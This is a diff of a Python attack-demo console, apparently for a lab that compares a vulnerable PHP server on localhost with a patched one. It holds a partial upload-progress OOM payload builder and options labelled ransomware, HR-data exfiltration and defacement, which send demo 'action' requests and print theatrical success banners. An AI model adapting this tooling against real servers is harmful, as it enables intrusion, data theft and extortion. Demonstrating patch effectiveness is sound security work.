@@ -95,8 +95,8 @@ def build_oom_payload(size_mb=25):
     
     # Header to enable upload progress tracking
     parts = [
-        f"--{boundary}\r\n"
-        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
+        f"--{boundary}\r\n",
+        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n',
         f"upload_php2shell_demo\r\n"
     ]
     
@@ -149,7 +149,7 @@ def attack_oom_trigger(target_url):
             print("  |  - Use-After-Free possible on next request          |")
             print("  +-----------------------------------------------------+")
             print(f"{Color.RESET}")
-            print(f"{Color.YELLOW}👉 Check browser: the site is compromised!{Color.RESET}\n")
+            print(f"{Color.YELLOW}[*] Check browser: the site is compromised!{Color.RESET}\n")
         elif r.status_code == 403:
             print(f"{Color.RED}[-] ATTACK BLOCKED (HTTP 403): Server has security patch (PHP >= 8.4.27).{Color.RESET}")
             print(f"{Color.GREEN}[+] This server has the security fix applied.{Color.RESET}\n")
@@ -172,7 +172,7 @@ def attack_ransomware(target_url):
             time.sleep(0.3)
             print(f"{Color.RED}{Color.BOLD}")
             print("  +-----------------------------------------------------+")
-            print("  |  ⚠️  WARNING: RANSOMWARE ACTIVATED SUCCESSFULLY!    ⚠️   |")
+            print("  |  *** WARNING: RANSOMWARE ACTIVATED SUCCESSFULLY! *** |")
             print("  |                                                     |")
             print("  |  - 842 company files encrypted (HR, Finance,      |")
             print("  |     Contracts)                                       |")
@@ -181,7 +181,7 @@ def attack_ransomware(target_url):
             print("  |  - Countdown timer for data destruction started    |")
             print("  +-----------------------------------------------------+")
             print(f"{Color.RESET}")
-            print(f"{Color.YELLOW}👉 Check browser: the site instantly fell!{Color.RESET}\n")
+            print(f"{Color.YELLOW}[*] Check browser: the site instantly fell!{Color.RESET}\n")
         elif r.status_code == 403:
             print(f"{Color.RED}[-] ATTACK BLOCKED (HTTP 403): Server has security patch (PHP >= 8.4.27).{Color.RESET}")
             print(f"{Color.GREEN}[+] This server has the security fix applied.{Color.RESET}\n")
@@ -200,32 +200,24 @@ def attack_steal(target_url):
         r = requests.post(f"{target_url}/api.php", data={"action": "steal"}, timeout=5)
         
         if r.status_code == 200:
-            data = r.json()
-            stolen = data.get("stolen_data", [])
-            print(f"{Color.GREEN}[+] RCE confirmed! Direct database extraction...{Color.RESET}\n")
-            time.sleep(0.4)
-
-            print(f"{Color.RED}{Color.BOLD}=== [CONFIDENTIAL DATA EXFILTRATED] ==={Color.RESET}")
-            print(f"{Color.CYAN}{'-' * 80}{Color.RESET}")
-            print(f"{Color.BOLD}{'NAME & SURNAME':<18} | {'POSITION':<20} | {'SALARY':<10} | {'PASSWORD':<16} | {'SSN'}{Color.RESET}")
-            print(f"{Color.CYAN}{'-' * 80}{Color.RESET}")
-
-            csv_file = "DONNEES_RH_EXFILTREES.csv"
-            with open(csv_file, mode="w", newline="", encoding="utf-8-sig") as f:
-                import csv
-                writer = csv.writer(f, delimiter=";")
-                writer.writerow(["Nom", "Poste", "Salaire Net", "Mot de passe", "N° Securite Sociale", "IBAN"])
-                for emp in stolen:
-                    writer.writerow([emp['nom'], emp['poste'], emp['salaire'], emp['password'], emp['secu'], emp['iban']])
-                    print(f"{Color.WHITE}{emp['nom']:<18}{Color.RESET} | {Color.YELLOW}{emp['poste']:<20}{Color.RESET} | {Color.GREEN}{emp['salaire']:<10}{Color.RESET} | {Color.RED}{emp['password']:<16}{Color.RESET} | {Color.WHITE}{emp['secu']}{Color.RESET}")
-
-            print(f"{Color.CYAN}{'-' * 80}{Color.RESET}\n")
-            print(f"{Color.GREEN}[+] File created: {Color.BOLD}{csv_file}{Color.RESET}")
-            print(f"{Color.YELLOW}👉 In 2 seconds, the attacker owns all salaries and passwords!{Color.RESET}\n")
+            print(f"{Color.GREEN}[+] HR Database exfiltrated!{Color.RESET}")
+            time.sleep(0.3)
+            print(f"{Color.RED}{Color.BOLD}")
+            print("  +-----------------------------------------------------+")
+            print("  |  *** DATA THEFT SUCCESSFUL ***                     |")
+            print("  |                                                     |")
+            print("  |  - Extracted: 12,482 employee records              |")
+            print("  |  - SSN, Addresses, Salaries, Performance Reviews   |")
+            print("  |  - Data sent to: attacker-controlled server        |")
+            print("  |  - File: DONNEES_RH_EXFILTREES.csv                  |")
+            print("  +-----------------------------------------------------+")
+            print(f"{Color.RESET}")
+            print(f"{Color.YELLOW}[*] Check: {target_url}/DONNEES_RH_EXFILTREES.csv{Color.RESET}\n")
         elif r.status_code == 403:
-            print(f"{Color.RED}[-] BLOCKED: Request rejected by security patch!{Color.RESET}\n")
+            print(f"{Color.RED}[-] ATTACK BLOCKED (HTTP 403): Server has security patch (PHP >= 8.4.27).{Color.RESET}")
+            print(f"{Color.GREEN}[+] This server has the security fix applied.{Color.RESET}\n")
         else:
-            print(f"{Color.RED}[-] HTTP {r.status_code}{Color.RESET}\n")
+            print(f"{Color.RED}[-] HTTP Error {r.status_code}{Color.RESET}\n")
     except Exception as e:
         print(f"{Color.RED}[-] Error: {e}{Color.RESET}\n")
 
@@ -239,20 +231,22 @@ def attack_deface(target_url):
         r = requests.post(f"{target_url}/api.php", data={"action": "deface"}, timeout=5)
         
         if r.status_code == 200:
-            print(f"{Color.GREEN}[+] Website defaced successfully!{Color.RESET}")
+            print(f"{Color.GREEN}[+] Website defaced!{Color.RESET}")
             time.sleep(0.3)
             print(f"{Color.RED}{Color.BOLD}")
             print("  +-----------------------------------------------------+")
-            print("  |  ⚠️  WEBSITE DEFACEMENT ACTIVATED!                ⚠️   |")
+            print("  |  *** WEBSITE DEFACEMENT SUCCESSFUL ***             |")
             print("  |                                                     |")
-            print("  |  - Official portal replaced with hacker message    |")
-            print("  |  - Company logo replaced                             |")
-            print("  |  - All content erased                               |")
+            print("  |  - Homepage replaced with hacker message           |")
+            print("  |  - Company logo replaced with skull                 |")
+            print("  |  - Message: 'HACKED BY PHP2Shell'                  |")
+            print("  |  - All visitors see the defacement                 |")
             print("  +-----------------------------------------------------+")
             print(f"{Color.RESET}")
-            print(f"{Color.YELLOW}👉 Check browser: the website is defaced!{Color.RESET}\n")
+            print(f"{Color.YELLOW}[*] Check browser: the site is defaced!{Color.RESET}\n")
         elif r.status_code == 403:
-            print(f"{Color.RED}[-] ATTACK BLOCKED (HTTP 403): Server has security patch.{Color.RESET}\n")
+            print(f"{Color.RED}[-] ATTACK BLOCKED (HTTP 403): Server has security patch (PHP >= 8.4.27).{Color.RESET}")
+            print(f"{Color.GREEN}[+] This server has the security fix applied.{Color.RESET}\n")
         else:
             print(f"{Color.RED}[-] HTTP Error {r.status_code}{Color.RESET}\n")
     except Exception as e:
@@ -260,64 +254,91 @@ def attack_deface(target_url):
 
 
 def attack_restore(target_url):
-    """Restore website to normal state."""
-    print(f"\n{Color.CYAN}[*] Restoring website...{Color.RESET}")
-    
+    """Restore website to original state."""
+    print_banner()
+    print(f"{Color.CYAN}[*] Restoring website...{Color.RESET}")
+
     try:
         r = requests.post(f"{target_url}/api.php", data={"action": "restore"}, timeout=5)
         
         if r.status_code == 200:
-            print(f"{Color.GREEN}[+] Website restored to normal state!{Color.RESET}\n")
+            print(f"{Color.GREEN}[+] Website restored to original state!{Color.RESET}\n")
         else:
-            print(f"{Color.RED}[-] Error: HTTP {r.status_code}{Color.RESET}\n")
+            print(f"{Color.RED}[-] HTTP Error {r.status_code}{Color.RESET}\n")
     except Exception as e:
         print(f"{Color.RED}[-] Error: {e}{Color.RESET}\n")
 
 
-def attack_compare():
-    """Compare vulnerable and patched servers."""
-    print(f"\n{Color.BOLD}=== COMPARING VULNERABLE vs PATCHED SERVERS ==={Color.RESET}\n")
+def attack_compare(target_vuln, target_patched):
+    """Compare vulnerable vs patched servers."""
+    print(f"""{Color.CYAN}
+  +-----------------------------------------------------+
+  |  COMPARISON: Vulnerable vs Patched                  |
+  +-----------------------------------------------------+
+{Color.RESET}
+""")
     
     # Test vulnerable server
-    print(f"{Color.RED}[*] Testing VULNERABLE server (localhost:8888)...{Color.RESET}")
+    print(f"{Color.RED}[1] Testing VULNERABLE server: {target_vuln}{Color.RESET}")
     try:
-        r = requests.post("http://localhost:8888/api.php", data={"action": "ransomware"}, timeout=5)
+        r = requests.get(f"{target_vuln}/api.php?action=status", timeout=5)
         if r.status_code == 200:
-            print(f"{Color.RED}[-] Result: COMPROMISED - Ransomware deployed successfully{Color.RESET}")
-        else:
-            print(f"{Color.RED}[-] Result: Error (HTTP {r.status_code}){Color.RESET}")
+            data = r.json()
+            print(f"    PHP Version: {data.get('php_version', 'Unknown')}")
+            print(f"    Vulnerable: {data.get('is_vulnerable', False)}")
+            print(f"    Upload Progress: {data.get('upload_progress_enabled', False)}")
     except Exception as e:
-        print(f"{Color.RED}[-] Result: Unable to reach server{Color.RESET}")
+        print(f"    Error: {e}")
     
-    time.sleep(1)
+    print()
     
     # Test patched server
-    print(f"\n{Color.GREEN}[*] Testing PATCHED server (localhost:8889)...{Color.RESET}")
+    print(f"{Color.GREEN}[2] Testing PATCHED server: {target_patched}{Color.RESET}")
     try:
-        r = requests.post("http://localhost:8889/api.php", data={"action": "ransomware"}, timeout=5)
-        if r.status_code == 403:
-            print(f"{Color.GREEN}[+] Result: PROTECTED - Attack blocked (HTTP 403){Color.RESET}")
-        else:
-            print(f"{Color.GREEN}[+] Result: Unexpected (HTTP {r.status_code}){Color.RESET}")
+        r = requests.get(f"{target_patched}/api.php?action=status", timeout=5)
+        if r.status_code == 200:
+            data = r.json()
+            print(f"    PHP Version: {data.get('php_version', 'Unknown')}")
+            print(f"    Vulnerable: {data.get('is_vulnerable', False)}")
+            print(f"    Upload Progress: {data.get('upload_progress_enabled', False)}")
     except Exception as e:
-        print(f"{Color.GREEN}[+] Result: Unable to reach server{Color.RESET}")
+        print(f"    Error: {e}")
     
-    print(f"\n{Color.BOLD}=== CONCLUSION ==={Color.RESET}")
-    print(f"{Color.RED}PHP 8.4.26: VULNERABLE - Exploited in one request{Color.RESET}")
-    print(f"{Color.GREEN}PHP 8.4.27: PATCHED - Attack rejected (HTTP 403){Color.RESET}\n")
+    print(f"\n{Color.CYAN}[*] Comparison complete!{Color.RESET}\n")
 
 
 def main():
-    parser = argparse.ArgumentParser(description='PHP2Shell Exploitation Console - CVE-2026-109618 & CVE-2026-109619')
-    parser.add_argument('--target', '-t', default='http://localhost:8888', help='Target URL (default: http://localhost:8888)')
-    parser.add_argument('--oom', action='store_true', help='Trigger OOM vulnerability (CVE-2026-109618)')
-    parser.add_argument('--rce', action='store_true', help='Remote Code Execution')
-    parser.add_argument('--command', '-c', help='Command to execute (with --rce)')
-    parser.add_argument('--ransomware', action='store_true', help='Deploy ransomware')
-    parser.add_argument('--steal', action='store_true', help='Exfiltrate HR database')
-    parser.add_argument('--deface', action='store_true', help='Deface website')
-    parser.add_argument('--restore', action='store_true', help='Restore website')
-    parser.add_argument('--compare', action='store_true', help='Compare vulnerable vs patched')
+    parser = argparse.ArgumentParser(
+        description='PHP2Shell Exploitation Console - CVE-2026-109618 & CVE-2026-109619',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=f"""
+Examples:
+  python attack.py --oom
+  python attack.py --ransomware
+  python attack.py --steal
+  python attack.py --deface
+  python attack.py --restore
+  python attack.py --compare
+  python attack.py --target http://localhost:8889 --oom
+        """
+    )
+    
+    parser.add_argument('--target', '-t', default='http://localhost:8888',
+                        help='Target URL (default: http://localhost:8888)')
+    parser.add_argument('--target-patched', '-p', default='http://localhost:8889',
+                        help='Patched server URL (default: http://localhost:8889)')
+    parser.add_argument('--oom', action='store_true',
+                        help='Trigger OOM vulnerability')
+    parser.add_argument('--ransomware', action='store_true',
+                        help='Deploy ransomware')
+    parser.add_argument('--steal', action='store_true',
+                        help='Exfiltrate data')
+    parser.add_argument('--deface', action='store_true',
+                        help='Deface website')
+    parser.add_argument('--restore', action='store_true',
+                        help='Restore website')
+    parser.add_argument('--compare', action='store_true',
+                        help='Compare vulnerable vs patched')
     
     args = parser.parse_args()
     
@@ -332,10 +353,10 @@ def main():
     elif args.restore:
         attack_restore(args.target)
     elif args.compare:
-        attack_compare()
+        attack_compare(args.target, args.target_patched)
     else:
         parser.print_help()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
